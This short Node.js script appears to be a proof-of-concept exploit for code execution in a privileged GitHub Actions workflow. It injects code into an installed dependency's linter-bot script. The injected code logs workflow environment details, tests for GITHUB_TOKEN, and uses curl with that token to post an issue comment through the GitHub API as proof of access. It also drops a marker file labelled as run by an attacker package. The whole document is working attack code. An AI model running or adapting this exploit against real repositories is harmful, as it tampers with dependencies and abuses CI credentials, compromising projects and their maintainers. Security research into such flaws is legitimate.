const fs = require('fs');
const { spawnSync } = require('child_process');
const target = 'node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js';
const marker = "\nconsole.log('=== RCE_CONFIRMED_IN_PRIVILEGED_WORKFLOW ===');" +
  "\nconsole.log('RCE_CWD=' + process.cwd());" +
  "\nconsole.log('RCE_EVENT=' + process.env.GITHUB_EVENT_NAME);" +
  "\nconsole.log('RCE_WORKFLOW=' + process.env.GITHUB_WORKFLOW);" +
  "\nconsole.log('RCE_REF=' + process.env.GITHUB_REF);" +
  "\nconsole.log('RCE_REPO=' + process.env.GITHUB_REPOSITORY);" +
  "\nconsole.log('RCE_TOKEN_PRESENT=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));" +
  "\ntry { const _r = require('child_process').spawnSync('curl', ['-sS','-m','20','-o','/tmp/rce_comment.json','-w','%{http_code}','-X','POST','-H','Authorization: Bearer ' + process.env.GITHUB_TOKEN,'-H','Accept: application/vnd.github+json','https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/1/comments','-d','{\"body\":\"RCE_TOKEN_CAN_COMMENT\"}'], {encoding:'utf8'}); console.log('RCE_COMMENT_HTTP=' + _r.stdout); console.log('RCE_COMMENT_BODY=' + require('fs').readFileSync('/tmp/rce_comment.json','utf8').slice(0,400)); } catch (e) { console.log('RCE_CURL_ERR=' + e.message); }" +
  "\n";
fs.appendFileSync(target, marker);
fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'executed-by-attacker-package');
